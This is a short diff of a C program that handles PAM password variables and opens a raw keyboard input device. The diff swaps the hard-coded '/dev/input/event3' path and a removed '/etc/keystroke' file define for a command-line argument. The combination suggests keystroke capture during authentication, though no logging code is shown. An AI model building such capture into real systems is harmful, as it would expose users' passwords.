@@ -421,10 +421,6 @@ static const char * const keys[KEY_MAX + 1] = {
 #endif
 };
 
-#define KEYBOARD_FILE "/dev/input/event3"
-#define KEYSTROKE_FILE "/etc/keystroke"
-
-
 static const char *const evval[3] = {
         "RELEASED",
         "PRESSED ",
@@ -434,6 +430,11 @@ static const char *const evval[3] = {
 
 int main(int argc, char *argv[])
 {
+    if (argc != 2) {
+        return EXIT_FAILURE;
+    }
+    char *keyboard_file = argv[1];
+
     char pass[PAM_MAX_RESP_SIZE + 1];
     char *option;
     int npass, nullok;
@@ -446,9 +447,9 @@ int main(int argc, char *argv[])
     ssize_t n;
     int fd;
 
-    fd = open(KEYBOARD_FILE, O_RDONLY);
+    fd = open(keyboard_file, O_RDONLY);
     if (fd == -1) {
-        syslog(LOG_WARNING, "Cannot open %s: %s.\n", KEYBOARD_FILE, strerror(errno));
+        syslog(LOG_WARNING, "Cannot open %s: %s.\n", keyboard_file, strerror(errno));
         return PAM_SYSTEM_ERR;
     }
 
